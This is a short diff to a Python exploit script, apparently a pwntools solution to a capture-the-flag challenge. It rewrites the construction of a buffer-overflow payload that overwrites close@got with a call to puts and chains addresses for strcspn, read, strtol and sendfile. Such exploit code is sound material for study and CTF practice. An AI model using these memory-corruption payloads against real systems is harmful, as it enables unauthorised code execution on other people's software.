@@ -63,12 +63,6 @@ def solve():
 
     # override close@got with `call puts` (rerun BOF)
 
-    payload = p64(call_puts)
-    payload += p64(strcspn)
-    payload += p64(read)
-    payload += p64(strtol)
-    payload += p64(sendfile)
-
     payload = flat(
         [
             call_puts,
